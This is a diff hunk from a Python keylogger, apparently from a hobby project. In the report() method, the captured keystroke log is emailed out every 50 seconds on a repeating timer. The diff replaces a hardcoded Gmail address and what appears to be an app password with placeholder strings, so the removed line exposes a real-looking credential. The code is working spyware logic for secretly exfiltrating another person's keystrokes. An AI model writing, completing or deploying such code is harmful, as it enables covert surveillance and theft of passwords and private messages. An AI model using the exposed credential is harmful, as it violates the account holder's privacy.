@@ -31,7 +31,7 @@ class Keylogger:
     def report(self):                        # send me report after range of time
         global log
         print(log)
-        self.send_mail("hatemharby98@gmail.com", "bagqkonqowogcloj", log)
+        self.send_mail("your mail", "your passwd", log)
         log = " "
         timer = threading.Timer(50, self.report )                 # call fun report after each 5 sec
         timer.start()                                               # start counter
